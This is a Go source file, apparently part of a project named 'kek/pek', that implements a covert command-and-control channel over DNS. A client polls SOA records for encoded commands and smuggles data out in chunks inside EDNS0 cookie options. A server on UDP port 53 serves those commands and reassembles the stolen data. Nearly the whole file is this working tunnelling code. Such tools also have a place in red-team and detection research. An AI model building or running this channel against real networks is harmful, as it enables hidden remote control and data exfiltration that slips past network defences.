package protocol

import (
	"fmt"
	"strings"
	"time"

	"github.com/kek/pek/internal/codec"
	"github.com/miekg/dns"
)

type CookieProtoClient struct {
	codec    codec.Codec[string]
	resolver string
	domain   string
	delay    time.Duration
}

func NewCookieProtoClient(resolver string, domain string, delay time.Duration) *CookieProtoClient {
	return &CookieProtoClient{
		codec:    codec.NewCookieCodec(),
		resolver: resolver,
		domain:   domain,
		delay:    delay,
	}
}

func (proto *CookieProtoClient) FetchCmd() (string, error) {
	cmdResponse, err := proto.resolve(dns.TypeSOA, "")
	if err != nil {
		return "", err
	}

	if len(cmdResponse) == 1 {
		if cmdRecord, ok := cmdResponse[0].(*dns.SOA); ok {
			decoded, err := proto.codec.DecodeCmd(cmdRecord.Ns)
			if err != nil {
				return "", fmt.Errorf("Unexpected content of SOA record")
			}

			return string(decoded), nil
		} else {
			return "", fmt.Errorf("Unexpected response instead of SOA record")
		}
	}

	return "", fmt.Errorf("Unexpected amount of DNS answers")
}

func (proto *CookieProtoClient) Send(data []byte) error {
	encodedData := proto.codec.Encode(data)
	counter := 0
	for _, part := range encodedData {
		fmt.Printf("Sending: %v ... ", part)
		for {
			time.Sleep(proto.delay)

			answer, err := proto.resolve(dns.TypeKX, part)
			if err != nil {
				continue
			}

			counter++

			if len(answer) > 0 {
				if record, ok := answer[0].(*dns.KX); ok {
					if strings.Contains(record.Exchanger, part) {
						fmt.Printf("OK\n")
						break
					}
				}
			}

			time.Sleep(proto.delay)
		}
	}
	fmt.Printf("Done in %d requests.\n\n", counter)

	return nil
}

func (proto *CookieProtoClient) resolve(qtype uint16, cookie string) ([]dns.RR, error) {
	m := new(dns.Msg)
	m.SetQuestion(dns.Fqdn(proto.domain), qtype)
	m.RecursionDesired = true

	if cookie != "" {
		o := &dns.OPT{
			Hdr: dns.RR_Header{
				Name:   ".",
				Rrtype: dns.TypeOPT,
			},
		}

		e := &dns.EDNS0_COOKIE{
			Code:   dns.EDNS0COOKIE,
			Cookie: cookie,
		}

		o.Option = append(o.Option, e)
		m.Extra = append(m.Extra, o)
	}

	c := &dns.Client{Timeout: 1 * time.Second}

	response, _, err := c.Exchange(m, proto.resolver)
	if err != nil {
		return nil, err
	}

	return response.Answer, nil
}

type CookieProtoServer struct {
	codec     codec.Codec[string]
	cmd       string
	listening bool
	c         chan string
}

func NewCookieProtoServer() *CookieProtoServer {
	return &CookieProtoServer{
		codec: codec.NewCookieCodec(),
		c:     make(chan string, 10),
	}
}

func (proto *CookieProtoServer) serverHandler(w dns.ResponseWriter, r *dns.Msg) {
	msg := new(dns.Msg)
	msg.SetReply(r)
	msg.Authoritative = true

	switch r.Question[0].Qtype {
	case dns.TypeSOA:
		msg.Answer = append(msg.Answer, &dns.SOA{
			Hdr:     dns.RR_Header{Name: r.Question[0].Name, Rrtype: dns.TypeSOA, Class: dns.ClassINET, Ttl: 0},
			Ns:      proto.codec.EncodeCmd(proto.cmd),
			Mbox:    "kek.pek.",
			Serial:  3,
			Refresh: 1,
			Retry:   3,
			Expire:  3,
			Minttl:  7,
		})

		if proto.cmd != "" {
			fmt.Println("Command received")
		}
	default:
		if edns := r.IsEdns0(); edns != nil {
			for _, opt := range edns.Option {
				if cookie, ok := opt.(*dns.EDNS0_COOKIE); ok {
					chunk := cookie.Cookie

					if proto.listening {
						proto.c <- chunk
					}

					o := new(dns.OPT)
					o.Hdr.Name = "."
					o.Hdr.Rrtype = dns.TypeOPT
					e := new(dns.EDNS0_COOKIE)
					e.Code = cookie.Code
					e.Cookie = cookie.Cookie

					o.Option = append(o.Option, e)
					msg.Extra = append(msg.Extra, o)

					msg.Answer = append(msg.Answer, &dns.KX{
						Hdr:       dns.RR_Header{Name: r.Question[0].Name, Rrtype: dns.TypeKX, Class: dns.ClassINET, Ttl: 0},
						Exchanger: fmt.Sprintf("%s.", chunk),
					})
				}
			}
		}
	}

	w.WriteMsg(msg)
}

func (proto *CookieProtoServer) Serve() error {
	mux := dns.NewServeMux()
	mux.HandleFunc(".", proto.serverHandler)

	server := &dns.Server{
		Addr:    ":53",
		Net:     "udp",
		UDPSize: 512,
		Handler: mux,
	}

	return server.ListenAndServe()
}

func (proto *CookieProtoServer) SendCmd(cmd string) {
	proto.cmd = cmd
}

func (proto *CookieProtoServer) FetchData() []byte {
	proto.listening = true

	var buf []string
	for {
		part := <-proto.c
		if part == proto.codec.GetPrologue() {
			fmt.Printf("Receiving data")
			buf = nil
		}

		buf = append(buf, part)
		fmt.Printf(".")

		if part == proto.codec.GetEpilogue() {
			fmt.Printf("\n\n")

			decoded, err := proto.codec.Decode(buf)
			if err != nil {
				fmt.Printf("Error decoding response: %s", err)
			}

			proto.listening = false
			proto.cmd = ""
			return decoded
		}
	}
}
